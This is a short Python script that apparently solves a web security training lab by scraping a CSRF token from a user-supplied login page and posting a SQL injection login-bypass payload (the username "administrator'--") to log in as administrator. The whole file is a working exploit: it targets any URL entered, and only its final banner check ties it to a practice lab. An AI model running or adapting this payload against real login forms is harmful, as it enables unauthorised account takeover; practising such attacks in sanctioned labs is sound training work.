import re
import requests

# 1. Initialize session
session = requests.Session()

# 2. Get target URL
login_url = input("Enter the Link Address of the login page: ")

print("Stealing CSRF token from the login page...")
# Get login HTML
initial_page = session.get(login_url)

# Extract CSRF token
csrf_match = re.search(r'name="csrf" value="([^"]+)"', initial_page.text)

if csrf_match:
    csrf_token = csrf_match.group(1)
    print(f" ==> Found CSRF Token: {csrf_token}")
else:
    print(" ==> Error: Could not find CSRF token on the page.")
    exit()

# 3. Create payload
payload_data = {
    'csrf': csrf_token,
    'username': "administrator'--",
    'password': "admin12345"
}

print(f"Sending login bypass payload to: {login_url}")
# 4. Submit login form
session.post(login_url, data=payload_data, allow_redirects=True)

print("Checking home page for solution banner...")
# 5. Get home page
home_url = login_url.replace("/login", "/")
response = session.get(home_url)

# 6. Verify success
if "Congratulations, you solved the lab!" in response.text:
    print("==> Success: Logged in as administrator and solved the lab!")
else:
    print("==> Failed: Exploit did not trigger the solution. Check if your lab URL has expired.")
